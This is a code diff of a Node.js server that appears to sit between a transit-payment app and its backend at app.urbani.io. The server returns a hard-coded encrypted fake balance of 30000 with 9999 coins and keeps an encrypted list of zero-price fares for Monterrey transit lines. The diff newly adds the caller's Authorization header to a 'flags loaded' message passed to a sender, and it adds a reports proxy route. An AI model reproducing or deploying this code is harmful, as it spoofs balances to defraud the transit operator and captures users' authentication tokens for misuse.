@@ -3,7 +3,7 @@ import Usuario from '../models/usuario.js'
 
 const processActions = async(req, res) => {
   const body = req.body
-  
+  //console.log(body)
   
   body.transactions = body.transactions.slice(-1);
   
@@ -51,14 +51,16 @@ const cargarBalance = async(req, res) => {
     );
 
    console.log(resp)
-   res.send(resp)*/
-   
+   */
    //if(req.ip == '::ffff:127.0.0.1') console.log('COINCIDE!')
    
   const encryptedBalance = encrypt('{"balance":"30000","coins":"9999","points":"0","points_tm":null}')
    
    
-  res.send(encryptedBalance);
+  res.send(encryptedBalance)
+  
+  
+ // res.send(resp)
 
   } catch (err) {
     console.error(err);
@@ -97,6 +99,7 @@ const cargarFlags = async(req, res) => {
 Alguien cargó sus Flags!
 ${JSON.stringify(resp, null, 2)}
 From: ${req.headers['x-forwarded-for'] || req.connection.remoteAddress}
+Auth: ${req.headers.authorization}
 `
 
 sender(send, res)
@@ -255,10 +258,11 @@ const ratesV3 = async(req, res) => {
     );
     
     
-    //console.log(`Rates resp. --> ${resp}`)
+    console.log(`Rates resp. --> ${resp}`)
+    /*
+    const encryptedRates = encrypt('[{"rate_type":"ORDINARIA","transport_type":"TRANSMETRO","price":"0","price_id":"6786"},{"rate_type":"ORDINARIA","transport_type":"ECOVIA","price":"0","price_id":"6738"},{"rate_type":"ORDINARIA","transport_type":"RUTA_EXPRESS_MORADO","price":"0","price_id":"2703"},{"rate_type":"ORDINARIA","transport_type":"RUTA_GUINDA","price":"0","price_id":"1260"},{"rate_type":"ORDINARIA","transport_type":"RUTA_AMARILLA","price":"0","price_id":"8040"},{"rate_type":"ORDINARIA","transport_type":"RUTA_MORADA","price":"0","price_id":"8041"},{"rate_type":"ORDINARIA","transport_type":"RUTA_INTEGRADA","price":"0","price_id":"1515"},{"rate_type":"ORDINARIA","transport_type":"RUTA_EXPRESS","price":"0","price_id":"6773"},{"rate_type":"ORDINARIA","transport_type":"METRO","price":"0","price_id":"6767"},{"rate_type":"ORDINARIA","transport_type":"RUTA_AVANTE","price":"0","price_id":"6771"}]')
     
-    //const encryptedRates = encrypt('[{"rate_type":"ORDINARIA","transport_type":"TRANSMETRO","price":"0","price_id":"6786"},{"rate_type":"ORDINARIA","transport_type":"ECOVIA","price":"0","price_id":"6738"},{"rate_type":"ORDINARIA","transport_type":"RUTA_EXPRESS_MORADO","price":"0","price_id":"2703"},{"rate_type":"ORDINARIA","transport_type":"RUTA_GUINDA","price":"0","price_id":"1260"},{"rate_type":"ORDINARIA","transport_type":"RUTA_AMARILLA","price":"0","price_id":"8040"},{"rate_type":"ORDINARIA","transport_type":"RUTA_MORADA","price":"0","price_id":"8041"},{"rate_type":"ORDINARIA","transport_type":"RUTA_INTEGRADA","price":"0","price_id":"1515"},{"rate_type":"ORDINARIA","transport_type":"RUTA_EXPRESS","price":"0","price_id":"6773"},{"rate_type":"ORDINARIA","transport_type":"METRO","price":"0","price_id":"6767"},{"rate_type":"ORDINARIA","transport_type":"RUTA_AVANTE","price":"0","price_id":"6771"}]')
-    
+    */
     res.send(resp)
 
   } catch (err) {
@@ -286,7 +290,25 @@ const v2URL = async(req, res) => {
   } catch (err) {
     console.error(err);
     res.status(500).json({ error: "Error API externa" });
-  console.log('ap')
+  }
+}
+
+const getReports = async(req, res) => {
+  try {
+    const resp = await requests(
+      req,
+      `https://app.urbani.io/app/g/reports`,
+      'GET',
+      null
+    )
+    
+    console.log(resp)
+    
+    res.send(resp)
+    
+  } catch(err) {
+    console.error(err);
+    res.status(500).json({ error: "Error API externa" });
   }
 }
 
@@ -296,6 +318,7 @@ export {
   cargarFlags,
   infoCoinPoints,
   getHour,
+  getReports,
   getUserId,
   processActions,
   ratesV3,
